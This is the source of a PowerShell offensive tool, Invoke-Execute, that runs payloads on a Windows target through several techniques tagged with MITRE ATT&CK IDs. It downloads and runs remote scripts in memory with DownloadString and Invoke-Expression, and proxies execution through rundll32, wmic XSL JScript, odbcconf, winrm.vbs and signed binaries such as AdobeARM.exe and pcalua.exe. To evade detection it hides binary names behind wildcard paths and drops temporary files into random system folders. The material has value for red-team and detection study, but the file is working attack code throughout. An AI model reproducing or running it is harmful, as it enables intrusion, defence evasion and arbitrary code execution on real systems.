<#
               
.SYNOPSIS

Execute payloads on a target system using a number of different techniques. Each technique includes a Mitre ATT&CK Reference.

.EXAMPLE

PS> Invoke-Execute -Help

PS> Invoke-Execute -List

PS> Invoke-Execute -RunDLL -Method 1 -File 'C:\temp\file.dll'

#>

function Invoke-Execute {
[CmdletBinding()]
param (
	[Parameter(ParameterSetName = 'help', Position=1)]
	[Switch]$Help,
	
	[Parameter(ParameterSetName = 'listcommands', Position=1)]
	[Switch]$List,
	
	[Parameter(ParameterSetName = 'downloadstring', Position=1)]
	[Switch]$DownloadString,
	[String]$Psurl,
	
	[Parameter(ParameterSetName = 'rundll', Position=1)]
	[Switch]$Rundll,
	[String]$Method,
	[string]$File,
	
	[Parameter(ParameterSetName = 'WmicExec', Position=1)]
	[Switch]$WmicExec,
	[string]$Command,
	
	[Parameter(ParameterSetName = 'WmicXSL', Position=1)]
	[Switch]$WmicXSL,
	[string]$command2=[string]$command,
	
	[Parameter(ParameterSetName = 'OdbcExec', Position=1)]
	[Switch]$OdbcExec,
	[string]$Dll,
	
	[Parameter(ParameterSetName = 'WinrmWmi', Position=1)]
	[Switch]$WinRmWmi,
	[string]$Command3=[string]$Command,
	
	[Parameter(ParameterSetName = 'SignedProxyDll', Position=1)]
	[Switch]$SignedProxyDll,
	[String]$Method2=[String]$Method,
	[String]$Dll2=[string]$Dll,
	
	[Parameter(ParameterSetName = 'SignedProxyExe', Position=1)]
	[Switch]$SignedProxyExe,
	[String]$Method3=[String]$Method,
	[String]$Exe
	
)
$DataDirs = @(
	("C:\ProgramData\Intel"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Diagnosis"),
	("C:\ProgramData\Microsoft\Diagnosis\FeedbackHub"),
	("C:\ProgramData\Microsoft\Diagnosis\Scripts"),
	("C:\ProgramData\Microsoft\Network\Downloader"),
	("C:\ProgramData\Microsoft\Search\Data"),
	("C:\ProgramData\Microsoft\Search\Data\Applications"),
	("C:\ProgramData\Microsoft\Search\Data\Temp"),
	("C:\ProgramData\Microsoft\Windows\WER\ReportArchive"),
	("C:\ProgramData\Microsoft\Windows\WER\ReportQueue"),
	("C:\ProgramData\Microsoft\Windows\WER\Temp"),
	("C:\ProgramData\WindowsHolographicDevices"),
	("C:\Users\Public\Libraries"),
	("C:\Users\Public\AccountPictures"),
	("C:\Users\Public\Documents"),
	("C:\Users\Public\Downloads"),
	("C:\Users\Public\Music"),
	("C:\Users\Public\Pictures"),
	("C:\Users\Public\Videos"),
	("C:\Users\Public\Roaming"),
	("C:\Windows\debug\WIA"),
	("C:\Windows\ServiceProfiles\LocalService"),
	("C:\Windows\ServiceProfiles\LocalService\AppData"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\Local"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\LocalLow"),
	("C:\Windows\Temp"),
	("C:\windows\system32\config"),
	("C:\Windows\System32\LogFiles\WMI"),
	("C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
)

$NewArray = foreach ($datadir in $datadirs) {
	if (Test-Path $datadir) {
	@($datadir)
	}
}
$datadir = ($newarray[(get-random -Maximum ([array]$newarray).count)])

$Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 13 | foreach {[char]$_}))
$Rs2 = (-join ((65..90) + (97..122) | Get-Random -Count 11 | foreach {[char]$_}))
$Rs3 = (-join ((65..90) + (97..122) | Get-Random -Count 9 | foreach {[char]$_}))
$Rs4 = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
	
	if ($Help) {
		
		Write @"
 
 ### Invoke-Execute HELP ###
 ---------------------------
 
 Invoke-Execute -Help
 
 Quick Command Reference: Invoke-Execute -List
 
 Available Invoke-Execute Commands:
 ----------------------------------
 /----------------------------------------------------------------------------/
 | -DownloadString [-PsUrl] url                                               |
 | --------------------------------------------------------------------       |
 |                                                                            |
 |  [*] Description: Executes a remote powershell script in memory            |
 |      using Net.WebClient DownloadString Method.                            |
 |                                                                            |
 |  [*] Mitre ATT&CK Ref: T1086 (PowerShell)                                  | 
 |      (https://attack.mitre.org/techniques/T1086/)                          |
 |                                                                            |
 |  [*] Usage: Invoke-Execute -DownloadString -psUrl http://server/script.ps1 |
 /----------------------------------------------------------------------------/
	   	   
 /-----------------------------------------------------------------------------/
 | -RunDLL [-Method] num [-File] path_to_dll                                   |
 | --------------------------------------------------------------------------  |
 |                                                                             |
 |  [*] Description: Executes a local DLL/EXE (or command) using               |
 |      rundll32 with a number of different methods.                           |
 |                                                                             |
 |  [*] Mitre ATT&CK Ref: T1085 (Rundll32)                                     |
 |      (https://attack.mitre.org/techniques/T1085/)                           |
 |                                                                             |
 |  [*] Usage: Invoke-Execute -RunDll -Method 1 -File C:\temp\File.dll         |
 |  [*] Usage: Invoke-Execute -RunDll -Method 5 -File 'cmd.exe /c net user....'|
 |                                                                             |
 |      Available RunDLL Methods:                                              |
 |                                                                             |
 |      [1] shell32.dll,Control_RunDLL   (DLL or CPL)                          |
 |      [2] shell32.dll,Control_RunDLLA  (DLL or CPL)                          |
 |      [3] IEAdvpack.dll,RegisterOCX    (DLL or EXE or COMMAND)               |
 |      [4] zipfldr.dll,RouteTheCall     (EXE)                                 |
 |      [5] advpack.dll,RegisterOCX      (DLL or EXE or COMMAND)               |
 |      [6] pcwutl.dll,LaunchApplication (EXE)                                 |
 /-----------------------------------------------------------------------------/
	
 /-----------------------------------------------------------------------------/
 | -WmicExec [-Command] "cmd.exe /c net user..."                               |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Executes a local command via wmic process call            |
 |      create.                                                                |
 |                                                                             |
 |  [*] Mitre ATT&CK Ref: T1047 (Windows Management Instrumentation)           |
 |      (https://attack.mitre.org/techniques/T1047/)                           |
 |                                                                             |
 |  [*] Usage: Invoke-Execute -WmicExec -Command "cmd.exe /c net user..."      |
 /-----------------------------------------------------------------------------/
		
 /-----------------------------------------------------------------------------/
 | -WmicXsl [-Command] "cmd.exe /c net user..."                                |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Utilizes wmic process get brief to execute an XSL         |
 |      file containing JScript ActiveXObject command.                         |
 |                                                                             | 
 |  [*] Mitre ATT&CK Ref: T1220 (XSL Script Processing)                        |
 |      (https://attack.mitre.org/techniques/T1220/)                           |
 |                                                                             |
 |  [*] Usage: Invoke-Execute -WmicXsl -Command "cmd.exe /c net user..."       |
 /-----------------------------------------------------------------------------/
		
 /-----------------------------------------------------------------------------/
 | -OdbcExec [-Dll] path_to_dll                                                |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Uses odbcconf.exe to execute a local DLL or DLL           |
 |      at a UNC path.                                                         |
 |                                                                             |
 |  [*] Mitre ATT&CK Ref: T1085 (Rundll32)                                     |
 |      (https://attack.mitre.org/techniques/T1085/)                           |
 |                                                                             |
 |  [*] Usage: Invoke-Execute -OdbcExec -Dll \\server\share\File.dll           |
 |  [*] Usage: Invoke-Execute -OdbcExec -Dll C:\temp\File.dll                  |
 /-----------------------------------------------------------------------------/
		
 /-----------------------------------------------------------------------------/
 | -WinRmWmi [-Command] "cmd /c net user ..."                                  |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Executes a command from an XML file                       |
 |      via winrm.vbs.                                                         |
 |                                                                             |
 |  [*] Mitre ATT&CK Ref: T1028 (Windows Remote Management)                    | 
 |      (https://attack.mitre.org/techniques/T1028/)                           |
 |                                                                             |
 |  [*] Usage: Invoke-Execute -WinRmWmi -Command cmd.exe                       |
 |  [*] Usage: Invoke-Execute -WinRmWmi -Command "cmd.exe /c net user...."     |
 |                                                                             |
 /-----------------------------------------------------------------------------/

 /-----------------------------------------------------------------------------/
 | -SignedProxyDll [-Method] num [-Dll] file.dll                               |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 | [*] Description: Executes a DLL via an existing signed binary.              |
 |                                                                             |
 | [*] Mitre ATT&CK Ref: T1218 (Signed Binary Proxy Execution)                 |
 |     (https://attack.mitre.org/techniques/T1218/)                            |
 |                                                                             |
 | [*] Usage: Invoke-Execute -SignedProxyDll -Method 1 -Dll C:\temp\file.dll   |
 |                                                                             |
 |      Available SignedProxyDll Methods:                                      |
 |                                                                             |
 |      [1] AdobeARM.exe                                                       |
 /-----------------------------------------------------------------------------/
 
 /-----------------------------------------------------------------------------/
 | -SignedProxyExe [-Method] num [-Exe] file.exe                               |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 | [*] Description: Executes an EXE via an existing signed binary.             |
 |                                                                             |
 | [*] Mitre ATT&CK Ref: T1218 (Signed Binary Proxy Execution)                 |
 |     (https://attack.mitre.org/techniques/T1218/)                            |
 |                                                                             |
 | [*] Usage: Invoke-Execute -SignedProxyExe -Method 1 -Exe C:\temp\file.exe   |
 |                                                                             |
 |     Available SignedProxyExe Methods:                                       |
 |                                                                             |
 |      [1] pcalua.exe                                                         |
 /-----------------------------------------------------------------------------/
 
"@
	}
	
	elseif ($List -eq $True) {
		Write @"  

 Invoke-Execute Command List:
 ----------------------------
 Invoke-Execute -DownloadString [-PsUrl] url
 Invoke-Execute -RunDLL [-Method] num [-File] 'path_to_dll' or 'path_to_exe'
 Invoke-Execute -WmicExec [-Command] "cmd"
 Invoke-Execute -WmicXsl [-Command] "cmd"
 Invoke-Execute -OdbcExec [-Dll] path_to_dll
 Invoke-Execute -WinRmWmi [-Command] "cmd"
 Invoke-Execute -SignedProxyDll [-Method] num [-Dll] path_to_dll
 Invoke-Execute -SignedProxyExe [-Method] num [-Exe] path_to_exe

"@
	}

	elseif ($DownloadString -and $PsUrl) {
	
		$h = "`n### Invoke-Execute(DownloadString) ###`n"
		Try {
			(Invoke-Expression (New-Object Net.Webclient).Downloadstring($psurl))
			$h
			Write " [+] Executed the following powershell script in memory: $PsUrl"
			$h
		}
		Catch {
			$h
			Write "[!] Error. Check the remote file exists."
			$h
		}
	}	
	
	elseif ($RunDll -and $Method -eq 1 -and $File) {
	# https://www.thewindowsclub.com/rundll32-shortcut-commands-windows
	# https://twitter.com/mattifestation/status/776574940128485376
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\$rs1\..\..\..\windows\system32\shell32.dll,Control_RunDLL $File)
		$h
		Write " [+] Executed: rundll32.exe shell32.dll,Control_RunDLL $File"
		$h
	}
	elseif ($Rundll -and $Method -eq 2 -and $File) {
	# https://www.thewindowsclub.com/rundll32-shortcut-commands-windows
	# https://twitter.com/Hexacorn/status/885258886428725250
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\..\..\windows\system32\shell32.dll,Control_RunDLLA $File)
		$h
		Write " [+] Executed: rundll32.exe shell32.dll,Control_RunDLLA $File"
		$h
	}
	elseif ($Rundll -and $Method -eq 3 -and $File) {
	# https://twitter.com/0rbz_/status/974472392012689408
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\..\..\windows\system32\IEAdvpack.dll,RegisterOCX $File)
		$h
		Write " [+] Executed: rundll32.exe IEAdvpack.dll,RegisterOCX $File"
		$h
	}
	elseif ($Rundll -and $Method -eq 4 -and $File) {
	# https://twitter.com/Moriarty_Meng/status/977848311603380224
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\..\..\windows\system32\zipfldr.dll,RouteTheCall $File)
		$h
		Write " [+] Executed: rundll32.exe zipfldr.dll,RouteTheCall $File"
		$h
	}
	elseif ($Rundll -and $Method -eq 5 -and $File) {
	# https://twitter.com/bohops/status/977891963763675141
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\..\..\windows\system32\advpack.dll,RegisterOCX $File)
		$h
		Write " [+] Executed: rundll32.exe advpack.dll,RegisterOCX $File"
		$h
	}
	elseif ($Rundll -and $Method -eq 6 -and $File) {
	# https://twitter.com/harr0ey/status/989617817849876488
	# https://windows10dll.nirsoft.net/pcwutl_dll.html
		$h = "`n### Invoke-Execute(rundll) ###`n"
		(C:\??*?\*3?\?un?l*3?.?x? C:\$rs2\..\..\..\windows\system32\pcwutl.dll,LaunchApplication $File)
		$h
		Write " [+] Executed: rundll32.exe pcwutl.dll,LaunchApplication $File"
		$h	
	}	

	elseif ($WmicExec -and $Command) {
		Try {
			$h = "`n### Invoke-Execute(WmicExec) ###`n"
			$h
			(C:\??*?\*3?\?b?m\?m*c.?x? process call create $command)
			Write " `n [+] Command executed: $command"
			$h
		}
		Catch {
		
			Write " [!] Error."
			$h
		}
	}
	
	elseif ($WmicXSL -and $Command) {
	# https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html

		Try {
			$h = "`n### Invoke-Execute(WmicXSL) ###`n"
			$XslFileContent = @"
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="$rs2"
version="1.0">
<output method="text"/>
		<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
		var $rs1 = new ActiveXObject("WScript.Shell").Run("$Command");
		]]> </ms:script>
</stylesheet>
"@
			$h
			$XslFile = "$DataDir\$rs3.xsl"
			$WmicArgs = "/format:"
			(Set-Content -Path $XslFile -Value $XslFileContent)
			(C:\??*?\*3?\?b?m\?m*c.?x? process get brief $WmicArgs"`"$XslFile"`")
			Remove-Item $XslFile
			Write " [+] Command Executed: $command"
			$h
		}
		Catch {
			Write " [!] Unknown Error. Check that WMIC is present on the target."
		}
	}
	
	elseif ($OdbcExec -and $Dll) {
		$h ="`n### Invoke-Execute(OdbcExec) ###`n"
		$OdbcExeExists = (Test-Path "C:\??*?\*3?\?*co?f.?x?")
		if ($OdbcExeExists) {
			$h
			(C:\??*?\*3?\?*co?f.?x? /a `{REGSVR $Dll`})
			Write " Executed Command: odbcconf.exe /a {REGSVR $Dll}"
			$h
		}
		else {
			$h
			Write "$env:windir\odbcconf.exe not found. Can't execute this module."
			$h
			return
		}
	}
	
	elseif ($WinRmWmi -and $Command) {
	# https://twitter.com/harr0ey/status/1062468588299345920
	# https://lolbas-project.github.io/lolbas/Scripts/Winrm/
		$h = "`n### Invoke-Execute(WinRmWmi) ###`n"
		$WinrmStatus = (Get-Service -Name winrm | Select-Object -ExpandProperty status)
		$WinrmVbsExists = (Test-Path C:\??*?\*3?\w?nr?.v?s)
		
		if ($WinrmStatus -eq "Stopped") {
			$h
			Write "WinRM Service isn't running. If you're admin, try starting the WinRM Service with the 'winrm quickconfig' command."
			$h
			return
		}
		if ($Winrmstatus -eq "Running" -and $WinrmVbsExists) {

			$XmlFileContent = @"
<?xml version="1.0" encoding="UTF-8"?><!--JÕ›E$†›E$†›E$†’=·†E$†›E%†³E$†è'%‡’E$†è'H‰D$HE3ÀHT$PH‹L$Hÿ-->
<p:Create_INPUT xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process">
    <p:CommandLine><!--JÕ›E$†›E$†›E$†’=·†E$†›E%†³E$†è'%‡’E$†è'H‰D$HE3ÀHT$PH‹L$Hÿ-->$Command<!-- JÕ›E$†›E$†›E$†’=·†E$†›E%†³E$†è'%‡’E$†è'H‰D$HE3ÀHT$PH‹L$Hÿ--></p:CommandLine>
<!--JÕ›E$†›E$†›E$†’=·†E$†›E%†³E$†è'%‡’E$†è'H‰D$HE3ÀHT$PH‹L$Hÿ--><p:CurrentDirectory>C:\</p:CurrentDirectory>
</p:Create_INPUT>
"@
			$h
			$XmlFile = "$DataDir\$rs1"
			(Set-Content -Path $XmlFile -Value $XmlFileContent)
		
			(C:\??*?\*3?\c?c*i?t.?x? C:\$rs2\..\..\..\windows\system32\winrm.vbs i c wmicimv2/Win32_Process -SKipCAcheCk -SkIpCNchEck -file:$XmlFile)
			
			Remove-Item $XmlFile
			Write " Command Executed: $command"
			$h
		}
		else {
			$h
			Write "Couldn't find $env:windir\system32\winrm.vbs. Execution failed."
			$h
		}
	}
	
	elseif ($SignedProxyDll -and $Method -eq 1 -and $Dll) {
		$h = "`n### Invoke-Execute(SignedPivotDll) ###`n"
		$AdobeArmExe = (Get-Item 'C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe').FullName
		$AdobeARMExists = (Test-Path $AdobeArmExe)
		
		if ($AdobeARMExists) {
			
			(Copy-Item $AdobeArmExe -Destination $env:appdata\AdobeARM.exe)
			(Copy-Item $Dll -Destination $env:appdata\AdobeARMENU.dll)
			
			$command = "$env:appdata\AdobeARM.exe"
			Invoke-Expression $command
			$h 
			Write " [+] Executed $Dll using $AdobeArmExe."
			$h 
		}
		else {
			$h 
			Write " [-] Can't find the AdobeARM.exe binary."
			$h 
			return
		}
	}
	
	elseif ($SignedProxyExe -and $Method -eq 1 -and $Exe) {
		$h = "`n### Invoke-Execute(SignedPivotExe) ###`n"
		$PcaluaExists = (Test-Path C:\??*?\*3?\p?al*?.?x?)
		
		if ($PcaluaExists) {
		# https://twitter.com/0rbz_/status/912530504871759872
		# https://twitter.com/kylehanslovan/status/912659279806640128
			(C:\??*?\*3?\p?al*?.?x? -a $Exe)
			$h 
			Write " [+] Executed Command: pcalua.exe -a $Exe."
			$h 
		}
		else {
			$h 
			Write " [+] Couldn't find pcalua.exe. Quitting."
			$h 
			return
		}
	}
}
